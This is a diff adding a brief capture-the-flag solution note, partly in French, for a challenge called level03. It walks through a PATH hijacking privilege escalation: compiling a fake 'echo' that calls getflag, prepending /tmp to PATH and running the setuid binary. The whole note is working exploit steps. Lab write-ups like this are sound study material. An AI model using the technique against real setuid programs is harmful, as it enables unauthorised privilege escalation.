@@ -1,0 +1,9 @@
+level03 is suid donc exploit par variable PATH
+cd /tmp (permission for touch)
+vim echo.c
+int main(){system("getflag");}
+gcc echo.c -o echo
+chmod 777 echo
+export PATH=/tmp:$PATH
+cd ~
+./level03
